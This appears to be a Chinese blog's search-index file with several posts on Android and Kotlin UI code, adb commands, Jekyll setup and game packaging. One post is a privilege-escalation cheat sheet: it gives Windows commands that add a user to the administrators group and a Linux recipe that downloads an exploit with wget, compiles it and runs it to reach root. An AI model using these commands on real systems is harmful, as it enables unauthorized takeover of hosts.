{\n\n\t            }\n\n\t            override fun onPageScrolled(p0: Int, p1: Float, p2: Int) {\n\t            }\n\n\t            override fun onPageSelected(p0: Int) {\n\t                when (p0) {\n\t                    0 -> clickView(1)\n\t                    1 -> clickView(2)\n\t                    2 -> clickView(3)\n\t                    3 -> clickView(4)\n\t                    4 -> clickView(5)\n\t                }\n\t            }\n\t        })\n\t        vp1.currentItem = 0\n\t    }\n\n\t    private fun clearView() { // 清空View选中状态\n\t        val arg = ContextCompat.getColor(this, R.color.gray_deep)\n\t        tx1.setTextColor(arg)\n\t        tx2.setTextColor(arg)\n\t        tx3.setTextColor(arg)\n\t        tx4.setTextColor(arg)\n\t        tx5.setTextColor(arg)\n\t        view1.visibility = View.GONE\n\t        view2.visibility = View.GONE\n\t        view3.visibility = View.GONE\n\t        view4.visibility = View.GONE\n\t        view5.visibility = View.GONE\n\n\t    }\n\n\t    private fun clickView(position: Int) { // 选中View样式\n\t        val color = ContextCompat.getColor(this, R.color.pink)\n\t        when (position) {\n\t            1 -> {\n\t                clearView()\n\t                tx1.setTextColor(color)\n\t                view1.visibility = View.VISIBLE\n\n\t            }\n\t            2 -> {\n\t                clearView()\n\t                tx2.setTextColor(color)\n\t                view2.visibility = View.VISIBLE\n\t            }\n\t            3 -> {\n\t                clearView()\n\t                tx3.setTextColor(color)\n\t                view3.visibility = View.VISIBLE\n\t            }\n\t            4 -> {\n\t                clearView()\n\t                tx4.setTextColor(color)\n\t                view4.visibility = View.VISIBLE\n\t            }\n\t            5 -> {\n\t                clearView()\n\t                tx5.setTextColor(color)\n\t                view5.visibility = View.VISIBLE\n\t            }\n\t        }\n\t    }\n\n\t    class ViewPagerAdapter(views: List<View>) : PagerAdapter() { // ViewPager Adapter\n\t        var views1 = arrayListOf<View>()\n\t        init {\n\t            views1 = views as ArrayList<View>\n\t        }\n\n\t        override fun isViewFromObject(p0: View, p1: Any): Boolean {\n\t            return p0 == p1\n\t        }\n\n\t        override fun getCount(): Int {\n\t            return views1.size\n\t        }\n\n\t        override fun destroyItem(container: ViewGroup, position: Int, `object`: Any) {\n\t            container.removeView(views1.get(position))\n\t        }\n\n\t        override fun instantiateItem(container: ViewGroup, position: Int): Any {\n\t            container.addView(views1[position])\n\t            initView(position, container)\n\t            return views1[position]\n\t        }\n\n\t        fun initView(position: Int, container: ViewGroup) {\n\t            views1[position].findViewById<TextView>(R.id.text).text = container.context.getString(R.string.text) + position.toShort()\n\t        }\n\t    }\n\t}\n\n\n## 源码\n\n[constraintlayout](https://github.com/tea9/dear_kotlin_code/tree/master/constraintlayout)  \n\n","tags":["android"],"categories":["android"]},{"title":"内网提权命令","url":"/post/3415919552.html","content":"\n## Windows基础命令\n\n\tnet user xx\n\n\tquery user #查看用户登录情况\n\n\twhoami #当前用户权限\n\n\tsysteminfo #查看当前系统版本与补丁信息\n\n\tnet user xx 123456 /add #添加用户\n\n\tnet localgroup administrators xx /add #添加到管理员组\n\n\tnet localgroup \"Remote Desktop Users\" xx /add #如远程桌面连接不上那么添加远程桌面组\n\n\tipconfig #查看本机ip信息，可加 /all 参数\n\n\tnetstat -ano #查看端口情况\n\n\tdir c:\\ #查看目录\n\n\ttype c:\\Users\\admin\\Desktop\\1.txt #查看指定位置文件内容，一般为文本文件\n\n\techo 字符串>2.txt #写入文本到文件。特殊字符如<>等前面加^\n\n\tcopy 1.txt 3.php #复制文件\n\n\trename d:\\2.txt mspaint.bat #将某个路径下的文件重命名\n\n\ttasklist #查看所有进程占用的端口\n\n\ttaskkill /im xx.ext /f #强制结束指定进程 如 taskkill /im QQMusic.exe /f\n\n\n## Windows基础提权命令\n\n\t查看系统信息\n\tsysteminfo|findstr /B/C:\"OS名称\"/C:\"OS版本\"\n\n\t主机名\n\tHostname\n\n\t环境变量\n\tSet\n\n\t查看用户信息\n\tNet user\n\tNet1 user\n\n\t查看服务pid号\n\tTasklist/svc|find \"TermService\"\n\tnetstat -ano|find \"1488\"\n\n\t查看系统名\n\twmic os get caption\n\n\t查看补丁信息\n\twmic dfe get Description,HotFixID,InstalledOn|findstr /C:\"KB4013389\" /C:\"KB958644\"\n\n\t查看当前安装程序\n\twmic product get name,version\n\n## Linux基础命令\n\n\t查看系统版本信息\n\t\tcat /etc/issue\n\t\tcat /etc/*-release\n\t查看内核版本\n\t\tuname -a\n\n\n\n## Linux提权基础命令\n\n\t基础命令：\n\tuname -an\n\tid\n\tpwd\n\tcat /etc/issue\n\n\t套路：\n\twget http://exp/exp.c\n\tgcc -o exp exp.c\n\tchmod +x exp\n\t./exp\n\t...到root\n\n## LINK\n\n[【权限提升】Linux 提权常用命令集](https://zhuanlan.zhihu.com/p/42358253)  \n[SecWikiGithub](https://github.com/SecWiki)  \n[SecWiki](https://www.sec-wiki.com/)  \n[Exploit-db本地提权](https://www.exploit-db.com/local/)  \n[Windows提权漏洞集合](https://github.com/SecWiki/windows-kernel-exploits)  \n[Linux提权漏洞集合](https://github.com/SecWiki/linux-kernel-exploits)  \n[Mac-OS提权漏洞集合](https://github.com/SecWiki/macos-kernel-exploits)  \n\n\n\n\n","tags":["web安全"],"categories":["web安全"]},{"title":"博客说明","url":"/post/1523215152.html","content":"\n# 博客自定义指南\n\n博客链接/blog link  \n[tea9](https://tea9.xyz/)  \n\n使用[Jekyll](//jekyllrb.com)博客引擎  \n基于[Theme H2O](https://github.com/kaeyleo/jekyll-theme-H2O)修改  \n\n\n## 前置条件/Before：  \n\n需要你有  \n[GitHub](http://www.github.com/)  \n[Github Page](https://pages.github.com/)  \n[Jekyll](https://jekyllrb.com/)环境  \n\n如以上都有还有问题请参考  \n[使用jekyll搭建个人博客](https://tea9.xyz/2018/05/28/create_jekyll_blog1.html)  \n[jekyll-theme-H2O_README](https://github.com/kaeyleo/jekyll-theme-H2O/blob/master/README.md)  \n\n## 步骤/Step：  \n\n[github目录](https://github.com/tea9/tea9.github.io)\n\n**克隆项目：**  \n\n\tgit clone https://github.com/tea9/tea9.github.io.git\n\n**目录结构：**  \n\n```\n\t.\n\t├──_drafts # 草稿目录 -可以删除此目录/建议清空目录  \n\t├──_includes # 一些封装的布局  \n\t├──_layouts # 默认布局  \n\t├──_posts # 文章目录 -建议清空目录  \n\t├──assets # 一些前端文件  \n\t├──dev # 未编译的前端文件  \n\t├──laji # 我的之前博客文件 -目录建议删除  \n\t├──live2d # 首页的二次元小姐姐  \n\t├──pages  # 一些我自定义的页面  \n\t|\t├──about.md #关于我页面  \n\t|\t├──links.md # 友情链接页面  \n\t|\t└── message.md # 留言板页面  \n\t├──pdf # 文章里的引用的电子书 可以删除此目录  \n\t├──readme_img # README.md 中引用的图片 可以删除此目录  \n\t├──resource # 我的一些瞎写的样式 可以删除此目录  \n\t├──yoone # 有药待办 如果不需要 可以删除此目录  \n\t├──1.mp3 # 樱花页面自动播放的音乐  \n\t├──403.html  \n\t├──404.html  \n\t├──CNAME # 域名配置信息 如果你有域名可以修改 没有可以删除  \n\t├──README.md # 可以删除  \n\t├──README1.md # 可以删除  \n\t├──TODO.md # 我写的待办 可以删除  \n\t├──_config.yml # jekyll 配置文件  \n\t├──archives.html # 归档页面  \n\t├──categories.html # 分类页面  \n\t├──favicon.ico # 图标  \n\t├──feed.xml # rss文件  \n\t├──index.html # 首页页面  \n\t├──package-lock.json # 包文件  \n\t├──rakefile.rb # rake生成文章文件 命令 rake post title=\"文章名称\" \n\t├──sakura.html # 樱花页面  \n\t├──search.json # 搜索配置文件  \n\t└──tags.html # 标签页面  \n```\n\n\n\n**建议删除的目录/文件（不删除也没事）/Suggest Delete：**  \n```\n_drafts / laji / pdf / readme_img / resource / \nyoone / CNAME / README.md / README1.md / TODO.md\n```\n\n\n**修改配置文件/Need Update：**  \n```\n_config.yml  \n```\n\n以下建议修改成你自己的博客信息/Change it your message   \n\n\ttitle: '' 首页标题\n\tdescription: '' 首页描述\n\ts-description: ''  樱花页面描述\n\tkeyword: '' 关键字\n\turl: '' # your host\n\n以下如果不需要用#注释 需要就扒#号去掉  \n\n\tnav:\n\t  home: '/sakura.html' 首页\n\t  categories: '/categories.html' 分类页\n\t  archives: '/archives.html' 归档页\n\t#  tags: '/tags.html' 标签页\n\t#  about: '/about' 关于我页面\n\t  links: '/links/' 友情链接页\n\t#  message: '/message/' \n\t  yoone: '/yoone' 有药待办\n\t  rss: '/feed.xml' rss\n\n作者信息  \n\n\tauthor: 'tea9'\n\tnickname: 'tea9'\n\n评论配置信息（不要直接用我的，用我的肯定是不行的）  \n有两个评论系统3选1 用那个就直接改成true  \n\n然后配置改了  \n\ndisqus参考[disqus](https://disqus.com/)国内可能显示不了  \n\ngitalk参考[jekyll-theme-H2O的gitalk相关配置](https://tea9.xyz/2018/06/24/gitali_config.html)  \n\nvaline参考[Valine -- 一款极简的评论系统](https://ioliu.cn/2017/add-valine-comments-to-your-blog/\n)\n\n\n\tcomments:\n\t  disqus: false\n\t  disqus_url: 'https://liaokeyu.disqus.com/embed.js'\n\n\t  gitalk: true\n\t  gitalk_clientID: ''\n\t  gitalk_Secret: ''\n\t  gitalk_repo: ''\n\t  gitalk_owner: ''\n\t  gitalk_admin: ''\n\t  distractionFreeMode: false\n\n\t  valine: false\n\t  valine_app_id: ''\n\t  valine_app_key: ''\n\t  valine_placeholder: ''\n\t  valine_avatar: ''\n\n\n文章赞赏 不开就改成false  \n然后把图片链接改成自己的（不改我也不介意）  \n\n\treward:\n\t  enable: true\n\t  reward_comment: '' 显示的话\n\t  wechatpay: '' 微信支付链接\n\t  alipay: ''  支付宝支付链接\n\n首页显示的社交帐号（修改成你自己的）  \n\n\tsns:\n\t  github: ''\n\t  email: ''\n\t  zhihu: ''\n\t  juejin: ''\n\t  weibo: ''\n\t  twitter: ''\n\t  instagram: ''\n\t  douban: ''\n\t  facebook: ''\n\t  jianshu: ''\n\n百度统计修改成你自己的  \n\n\tbaidu-analysis: d49f14171852506bc53c0072034d9db9\n\n这是我的图床的链接 你要就修改成自己的  \n\n\timg_link: 'https://coding.net/u/tea9/p/image/git/raw/master/blog_img'\n\nlive-2d小姐姐开关true/false  \nhitokoto [一言](https://hitokoto.cn/)true/false  \n\n\tlive-2d: true\n\thitokoto: true\n\n这是自定义属性\n背景图 背景颜色 字体颜色  \n推荐一个颜色网站，和风的，颜色有点美[NIPPON COLORS](http://nipponcolors.com/)\n\n\tsty:\n\t  back-img: 'https://coding.net/u/tea9/p/image/git/raw/master/blog_img/appreciate/runa.png' 首页背景图\n\t  back-color: 'rgb(58,60,65)' 背景颜色（建议使用背景图同色系的）\n\t  b2t-back: '#3A3226' 返回顶部背景颜色\n\t  b2t-color: '#fff' 返回顶部字体颜色\n\t  ban-color: '#D7C4BB' banner字体颜色\n\t  post-color: '#fff' 文章列表字体颜色\n\t  foot-color: '#B19693' 底部栏字体颜色\n\t  md-color: '#fff' 文章字体颜色\n\n## 探索更多：\n\n[README](https://github.com/tea9/tea9.github.io/blob/master/README.md)  \n\n\n\n\n","tags":["blog"],"categories":["blog"]},{"title":"android复杂布局","url":"/post/2080958988.html","content":"\n示例图  \n![原型图](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/18/01.png)\n\n分析：  \n通过分析原型图，分为4个模块  \n\n1.轮播图  \n2.公告  \n3.指示器  \n4.内容列表  \n\n---\n\n实现：\n轮播图使用[BGABanner-Android](https://github.com/bingoogolapple/BGABanner-Android)库  \n公告使用ViewFlipper控件  \n指示器切换使用[MagicIndicator](https://github.com/hackware1993/MagicIndicator)库  \n内容列表使用ViewPager+Fragment（RecyclerView）  \n\n![实现图](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/18/03.png)\n\n其他依赖：  \n\n[anko](https://github.com/Kotlin/anko)  \n[BaseRecyclerViewAdapterHelper](https://github.com/CymChad/BaseRecyclerViewAdapterHelper)  \n[glide](https://github.com/bumptech/glide)  \n[gson](https://github.com/google/gson)  \n\n---\n源码：  \n[homepage](https://github.com/tea9/dear_kotlin_code/tree/master/homepage)\n\n目录结构：  \nactivity  \n-HomeViewPagerActivity  \nadapter  \n-ViewPagerAdapter  \nfragment  \n-TabFragment  \n\n---\n\n代码：  \n\nactivity_home_viewpager.xml  \n\t\n\t<android.support.design.widget.CoordinatorLayout\n\t    xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\"\n\t    android:layout_height=\"match_parent\"\n\t    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n\t    android:id=\"@+id/cl_page\">\n\n\t    <android.support.design.widget.AppBarLayout\n\t        android:layout_width=\"match_parent\"\n\t        android:layout_height=\"wrap_content\"\n\t        android:fitsSystemWindows=\"true\">\n\n\t        <android.support.v7.widget.Toolbar\n\t            android:id=\"@+id/toolbar\"\n\t            android:layout_width=\"match_parent\"\n\t            android:layout_height=\"wrap_content\"\n\t            app:contentInsetLeft=\"0dp\"\n\t            app:contentInsetStart=\"0dp\"\n\t            app:layout_scrollFlags=\"scroll|enterAlways\" >\n\t            <include\n\t                layout=\"@layout/item_banner\" />\n\n\t        </android.support.v7.widget.Toolbar>\n\n\t        <net.lucode.hackware.magicindicator.MagicIndicator\n\t            android:id=\"@+id/magic_indicator\"\n\t            android:layout_width=\"match_parent\"\n\t            android:layout_height=\"40dp\" />\n\t    </android.support.design.widget.AppBarLayout>\n\t    <LinearLayout\n\t        android:layout_width=\"match_parent\"\n\t        android:layout_height=\"match_parent\"\n\t        android:orientation=\"vertical\"\n\t        android:scrollbars=\"none\"\n\t        app:layout_behavior=\"@string/appbar_scrolling_view_behavior\">\n\t        <android.support.v4.view.ViewPager\n\t            android:id=\"@+id/view_pager\"\n\t            android:layout_width=\"match_parent\"\n\t            android:layout_height=\"match_parent\" />\n\t    </LinearLayout>\n\t</android.support.design.widget.CoordinatorLayout>\n\n\n分析：  \n使用CoordinatorLayout+AppBarLayout+Toolbar实现tab头部依附效果  \n![列表图](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/18/02.png)\nMagicIndicator指示器控件  \nViewPager指示器滑动切换  \n\n---\n\nitem_banner.xml  \n\n    <LinearLayout\n        xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\"\n        android:orientation=\"vertical\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\">\n    \n        <cn.bingoogolapple.bgabanner.BGABanner\n            android:id=\"@+id/banner\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"180dp\"\n            android:visibility=\"visible\"\n            app:banner_pageChangeDuration=\"1000\"\n            app:banner_pointAutoPlayAble=\"true\"\n            app:banner_pointContainerBackground=\"@android:color/transparent\"\n            app:banner_pointDrawable=\"@drawable/bga_banner_selector_point_hollow\"\n            app:banner_pointTopBottomMargin=\"15dp\"\n            app:banner_transitionEffect=\"alpha\" />\n    \n        <LinearLayout\n            xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\"\n            android:layout_height=\"40dp\"\n            android:orientation=\"horizontal\"\n            android:gravity=\"center_vertical\">\n            <ImageView\n                android:layout_width=\"15dp\"\n                android:layout_height=\"15dp\"\n                android:background=\"@mipmap/ic_notice_m\"\n                android:layout_marginStart=\"10dp\"\n                android:layout_marginEnd=\"10dp\"/>\n    \n            <ViewFlipper\n                android:id=\"@+id/view_flipper\"\n                android:layout_weight=\"1\"\n                android:layout_width=\"match_parent\"\n                android:layout_height=\"25dp\"\n                android:autoStart=\"true\"\n                android:layout_gravity=\"center_vertical\"\n                android:paddingTop=\"2dp\"\n                android:flipInterval=\"2000\"\n                android:inAnimation=\"@anim/anim_come_in\"\n                android:outAnimation=\"@anim/anim_get_out\">\n            </ViewFlipper>\n            <ImageView\n                android:layout_width=\"10dp\"\n                android:layout_height=\"10dp\"\n                android:background=\"@mipmap/ic_more\"\n                android:layout_marginStart=\"10dp\"\n                android:layout_marginEnd=\"10dp\"/>\n        </LinearLayout>\n    \n    </LinearLayout>\n\n\nitem_banner.xml实现了轮播图+公告  \n![轮播图+广告](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/18/04.png)\nBGABanner轮播图  \nViewFlipper公告\n\n---\n\n上下滚动动画：  \n\nanim/anim_come_in.xml\n\n    <set xmlns:android=\"http://schemas.android.com/apk/res/android\">\n    \n        <translate\n            android:fromYDelta=\"100%p\"\n            android:toYDelta=\"0\"\n            android:duration=\"1000\"/>\n    </set>\n\nanim/anim_get_out.xml\n\n    <set xmlns:android=\"http://schemas.android.com/apk/res/android\">\n        <translate\n            android:fromYDelta=\"0\"\n            android:toYDelta=\"-100%p\"\n            android:duration=\"1000\"/>\n    </set>\n\n\n---\n\n\nHomeViewPagerActivity.kt  \n\t\n\n    class HomeViewPagerActivity :AppCompatActivity() {\n    \n        var tabList = arrayListOf(\"tab1\",\"tab2\",\"tab3\",\"tab4\",\"tab5\",\"tab6\",\"tab7\")\n        var imgList:ArrayList<String> = arrayListOf(\"https://images.unsplash.com/photo-1531026383433-6ed5a112afbc?ixlib=rb-0.3.5&ixid=eyJhcHBfaWQiOjEyMDd9&s=c010c700aac502636ad0b579ce1274a4&auto=format&fit=crop&w=1650&q=80\",\"https://images.unsplash.com/photo-1531075515553-b4d1f75ff534?ixlib=rb-0.3.5&ixid=eyJhcHBfaWQiOjEyMDd9&s=b3f6b409e70fca36a74369d882e85f49&auto=format&fit=crop&w=1567&q=80\",\"https://images.unsplash.com/photo-1531130744926-1d86103aebeb?ixlib=rb-0.3.5&ixid=eyJhcHBfaWQiOjEyMDd9&s=28f240aae3de685fc4742f09c922f6f8&auto=format&fit=crop&w=1714&q=80\")\n        var mesList = arrayListOf(\"您的公告1\",\"您的公告2\",\"您的公告3\")\n        var dataList = arrayListOf<String>(\"hhhhhh\",\"sssss\",\"aaa\",\"bbb\",\"zzz\",\"aaa\",\"bbb\",\"kkk\",\"aaa\",\"bbb\",\"shaomiao\",\"aaa\",\"bbb\",\"ojj\",\"aaa\",\"bbb\",\"fjkjk\",\"aaa\",\"bbb\",\"dfkdkjk\",\"aaa\",\"bbb\")\n    \n    \n        override fun onCreate(savedInstanceState: Bundle?) {\n            super.onCreate(savedInstanceState)\n            setContentView(R.layout.activity_home_viewpager)\n            setSupportActionBar(toolbar)\n    \n            initBanner()\n            initViewFlipper()\n            initViewpager()\n            initMagicIndicator()\n        }\n    \n        fun initBanner() {\n            banner.setAdapter(BGABanner.Adapter<ImageView,String> { banner, itemView, model, position ->\n                Glide.with(itemView.context)\n                        .load(model)\n                        .apply(RequestOptions().placeholder(R.mipmap.ic_launcher).error(R.mipmap.ic_launcher).dontAnimate().centerCrop())\n                        .into(itemView)\n            })\n            banner.setData(imgList, Arrays.asList(\"\",\"\",\"\"))\n            // 点击事件\n            banner.setDelegate { banner, itemView, model, position -> toast(model.toString()+position) }\n        }\n    \n        fun initViewFlipper() {\n            for (i in mesList.indices) {\n                var view = LayoutInflater.from(this).inflate(R.layout.item_textview,null)\n                view.findViewById<TextView>(R.id.text_view).text = mesList[i]\n                view.setOnClickListener {\n                    toast(mesList[i]+i)\n                }\n                view_flipper.addView(view)\n            }\n            view_flipper.isAutoStart = true\n        }\n    \n        fun initMagicIndicator() {\n            var commonNavigator = CommonNavigator(this)\n            commonNavigator.adapter = object : CommonNavigatorAdapter() {\n                override fun getCount(): Int {\n                    return  if (tabList == null)0 else tabList.size\n                }\n    \n                override fun getTitleView(p0: Context?, p1: Int): IPagerTitleView {\n                    var colorTransitionPagerTitleView = ColorTransitionPagerTitleView(p0)\n                    colorTransitionPagerTitleView.normalColor= ContextCompat.getColor(p0!!,R.color.abc_btn_colored_borderless_text_material)\n                    colorTransitionPagerTitleView.selectedColor = ContextCompat.getColor(p0!!,R.color.abc_btn_colored_borderless_text_material)\n                    colorTransitionPagerTitleView.text = tabList[p1].toUpperCase()\n    \n                    colorTransitionPagerTitleView.setOnClickListener (View.OnClickListener {\n                        view_pager.currentItem = p1\n    \n                    })\n                    return colorTransitionPagerTitleView\n                }\n                override fun getIndicator(p0: Context?): IPagerIndicator {\n                    var indicator: LinePagerIndicator = LinePagerIndicator(p0)\n                    indicator.mode = LinePagerIndicator.MODE_EXACTLY\n                    indicator.setColors(ContextCompat.getColor(p0!!,R.color.abc_btn_colored_borderless_text_material))\n                    return indicator\n    \n                }\n            }\n            magic_indicator.navigator = commonNavigator\n            ViewPagerHelper.bind(magic_indicator,view_pager)\n        }\n    \n        fun initViewpager() {\n            var adapter = ViewPagerAdapter(supportFragmentManager,tabList, Gson().toJson(dataList))\n            view_pager.adapter = adapter\n        }\n    \n    }\n\n\ntabList:指示器数据  \nimgList:轮播图数据  \nmesList:公告数据  \ndataList:列表数据  \n\ninitBanner():初始化轮播图  \ninitViewFlipper():初始化公告  \ninitMagicIndicator():初始化指示器  \ninitViewpager():初始化ViewPager  \n\n---\n\nViewPagerAdapter.kt ViewPager适配器  \n\n\n    class ViewPagerAdapter(fm: FragmentManager?, var tabList:ArrayList<String>, var listStr:Any) : FragmentPagerAdapter(fm){\n    \n        override fun getItemPosition(`object`: Any): Int {\n            return PagerAdapter.POSITION_NONE\n        }\n    \n        override fun instantiateItem(container: ViewGroup, position: Int): Any {\n            var fragment :TabFragment = super.instantiateItem(container, position) as TabFragment\n            fragment.updateArguments(position, listStr.toString())\n            return fragment\n        }\n    \n        override fun getCount(): Int {\n            return  tabList.size\n        }\n    \n        override fun getPageTitle(position: Int): CharSequence? {\n            return tabList[position]\n        }\n    \n    \n        override fun getItem(position: Int): Fragment {\n            return  TabFragment.create(position, Gson().toJson(listStr))\n        }\n    \n    \n        override fun notifyDataSetChanged() {\n            super.notifyDataSetChanged()\n        }\n    }\n\n\n---\n\nTabFragment.kt  \n\n\n    class TabFragment: Fragment(){\n        var pageType:Int = 0\n        var data:String = \"\"\n        var adapter:BaseQuickAdapter<String,BaseViewHolder>? = null\n    \n        companion object TabFragment{\n            fun create(pageType:Int,data:String) : com.example.homepage.fragment.TabFragment {\n                var f = TabFragment()\n                var args = Bundle()\n                args.putInt(\"position\",pageType)\n                args.putString(\"data\",data)\n                f.arguments=args\n                return f\n            }\n        }\n    \n        override fun onCreate(savedInstanceState: Bundle?) {\n            super.onCreate(savedInstanceState)\n            var args: Bundle = arguments!!\n            if (null!=args) {\n                pageType = args.getInt(\"position\")\n                data = args.getString(\"data\")\n                Log.e(\"shaomiaodata\",data)\n            }\n        }\n    \n        override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {\n            var view: View = inflater.inflate(R.layout.recycler_view,container,false)\n            initRecyclerView(view)\n            return view\n        }\n    \n        fun initRecyclerView(view:View) {\n            var layoutManager = LinearLayoutManager(context)\n            layoutManager.orientation = OrientationHelper.VERTICAL\n            var recycler_view = view.findViewById<RecyclerView>(R.id.recycler_view)\n            recycler_view.layoutManager = layoutManager\n            recycler_view.addItemDecoration(DividerItemDecoration(context, LinearLayoutManager.VERTICAL))\n    \n            var list1=  data!!.fromListJson<String>()\n            adapter = object : BaseQuickAdapter<String,BaseViewHolder>(R.layout.item_layout,list1 as List<String>) {\n                override fun convert(helper: BaseViewHolder?, item: String?) {\n                    helper!!.setText(R.id.item_tv,item)\n                    helper.addOnClickListener(R.id.item_tv)\n                }\n            }\n            adapter!!.onItemChildClickListener = BaseQuickAdapter.OnItemChildClickListener { adapter, view, position ->\n                toast(\"itemclick\"+position)\n            }\n            recycler_view.adapter = adapter\n        }\n    \t// 解析json数据\n        inline fun <reified T> String.fromListJson(charset: Charset = Charset.forName(\"UTF-8\")): ArrayList<T>? {\n            val gson = GsonBuilder().create()\n            return gson.fromJson<ArrayList<T>>(this.toByteArray(charset).toString(charset),object : TypeToken<ArrayList<T>>(){}.type)\n        }\n    \n        fun updateArguments(pageType:Int,data:String) {\n            this.pageType = pageType\n            this.data = data\n            var args: Bundle = arguments!!\n            if (null!=args) {\n                args.putInt(\"pageType\",pageType)\n                args.putString(\"data\",data)\n            }\n        }\n    \n    }\n\n\n---\n源码：  \n[homepage](https://github.com/tea9/dear_kotlin_code/tree/master/homepage)","tags":["android"],"categories":["android"]},{"title":"Android的命令","url":"/post/2226304841.html","content":"\n## Tips\n[oh-my-zsh ，“zsh: command not found: adb”解决方法](https://blog.csdn.net/yianemail/article/details/51693583)\n \n\topen .zshrc\n\n\t在# User configuration添加\n\tsource ~/.bash_profile\n\n\t执行\n\tsource .zshrc\n\n\n## 关于Android的命令\n\n\n\t更新Android SDK\n\n\t$ adnroid update sdk --no-ui\n\n**ADB**  \nadb位于platform-tools文件夹，早期版本在tools文件夹内。  \n\n\t列出所有命令\n\tadb help all\n\n\t列出所有连接的Android设备和虚拟机\n\tadb devices\n\n\t将电脑上的文件复制到设备（通常存到SD卡）\n\tadb push <local> <remote>\n\n\t将设备上的文件复制到电脑\n\tadb pull <remote> <local>\n\n\n**ADB和多设备**  \n\n\t$ adb devices\n\t$ adb -s xxxxx logcat\n\t$ adb logcat MyActivity:* *:S // <tag>:<prioroty>  *表示可能的值  AndroidRuntime:*参数 Android系统相关的日志信息以及由平台引起的应用程序异常\n\n\n**Wi-Fi连接adb**  \n\n\t$ adb devices\n\tList of devices attached\n\t0000000  device\n\t$ adb tcpip 5555\n\t$ adb commect 192.168.1.104\n\t$ adb devices\n\tList of devices attached\n\t192.168.1.104:5555 device\n\n\n**执行命令**  \n\n\t$ adb shell\n\t$ adb shell am startservice -a <intent action> // 启动service\n\t$ adb shell pm list packages // 列出所有已安装的包\n\n**更多adb命令**  \n\n[adb命令](http://developer.android.com/tools/help/adb.html)\n","tags":["android","android逆向"],"categories":["android逆向"]},{"title":"RPG_Maker_MV-安卓HTML一键打包","url":"/post/3697117284.html","content":"\n## tips\n这个软件是收费的  \n免费版不能修改icon和包名  \n\n## 使用html一键打包工具\n\n[HTML一键打包APK工具](http://www.krpano.tech/archives/420)  \n\n[HTML压缩包下载](https://pan.baidu.com/s/18zv4O-BD-mWKQYApTj-r4g?errno=0&errmsg=Auth%20Login%20Sucess&&bduss=&ssnerror=0&traceid=)\n\n## 部署项目\n文件-部署-Android/IOS\n![打包项目](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/01.png)\n![www文件目录](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/03.png)\n\n## 使用HTML一键打包工具进行打包\n\n1.下载HTML一键打包工具  \n2.安装HTML一键打包工具  \n路径选择为www下index.html  \n![打包配置](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/02.png)\n\n## 注意事项\n\n1.文件名不要中文\n2.项目中不能含有中文的名称\n\n## 参考链接\n\n[RPG MAKER MV 打包APK教程(一键打包,无需编写任何代码)](https://blog.csdn.net/u012416063/article/details/81264317)  \n\n\n\n","tags":["rpgmakermv"],"categories":["rpgmakermv"]},{"title":"fragment懒加载","url":"/post/2289611691.html","content":"\n## Fragment懒加载\n用于viewpager+fragment布局  \n\n\timport android.os.Bundle;\n\timport android.view.LayoutInflater;\n\timport android.view.View;\n\timport android.view.ViewGroup;\n\timport android.view.ViewGroup.LayoutParams;\n\timport android.widget.FrameLayout;\n\n\t/**\n\t * <h1>懒加载Fragment</h1> 只有创建并显示的时候才会调用onCreateViewLazy方法<br>\n\t * <br>\n\t * <p>\n\t * 懒加载的原理onCreateView的时候Fragment有可能没有显示出来。<br>\n\t * 但是调用到setUserVisibleHint(boolean isVisibleToUser),isVisibleToUser =\n\t * true的时候就说明有显示出来<br>\n\t * 但是要考虑onCreateView和setUserVisibleHint的先后问题所以才有了下面的代码\n\t * <p>\n\t * 注意：<br>\n\t * 《1》原先的Fragment的回调方法名字后面要加个Lazy，比如Fragment的onCreateView方法， 就写成onCreateViewLazy <br>\n\t * 《2》使用该LazyFragment会导致多一层布局深度\n\t * <p>\n\t * LuckyJayce\n\t */\n\tpublic class LazyFragment extends BaseFragment {\n\t\tprivate boolean isInit = false;\n\t\tprivate Bundle savedInstanceState;\n\t\tpublic static final String INTENT_BOOLEAN_LAZYLOAD = \"intent_boolean_lazyLoad\";\n\t\tprivate boolean isLazyLoad = true;\n\t\tprivate FrameLayout layout;\n\n\t\t@Deprecated\n\t\tprotected final void onCreateView(Bundle savedInstanceState) {\n\t\t\tsuper.onCreateView(savedInstanceState);\n\t\t\tthis.savedInstanceState = savedInstanceState;\n\t\t\tBundle bundle = getArguments();\n\t\t\tif (bundle != null) {\n\t\t\t\tisLazyLoad = bundle.getBoolean(INTENT_BOOLEAN_LAZYLOAD, isLazyLoad);\n\t\t\t}\n\t\t\t//为什么不直接getUserVisibleHint();而是通过自己存isVisibleToUserState变量判断\n\t\t\t//因为v4的25的版本 已经调用 setUserVisibleHint(true)，结果到这里getUserVisibleHint是false\n\t\t\t// （ps:看了FragmentManager源码Fragment被重新创建有直接赋值isVisibleToUser不知道是不是那里和之前v4有改动的地方）\n\t\t\t//所以我默认VISIBLE_STATE_NOTSET，之前没有调用setUserVisibleHint方法，就用系统的getUserVisibleHint，否则就用setUserVisibleHint后保存的值\n\t\t\t//总之就是调用了setUserVisibleHint 就使用setUserVisibleHint的值\n\t\t\tboolean isVisibleToUser;\n\t\t\tif (isVisibleToUserState == VISIBLE_STATE_NOTSET) {\n\t\t\t\tisVisibleToUser = getUserVisibleHint();\n\t\t\t} else {\n\t\t\t\tisVisibleToUser = isVisibleToUserState == VISIBLE_STATE_VISIABLE;\n\t\t\t}\n\t\t\tif (isLazyLoad) {\n\t\t\t\tif (isVisibleToUser && !isInit) {\n\t\t\t\t\tisInit = true;\n\t\t\t\t\tonCreateViewLazy(savedInstanceState);\n\t\t\t\t} else {\n\t\t\t\t\tLayoutInflater layoutInflater = inflater;\n\t\t\t\t\tif (layoutInflater == null) {\n\t\t\t\t\t\tlayoutInflater = 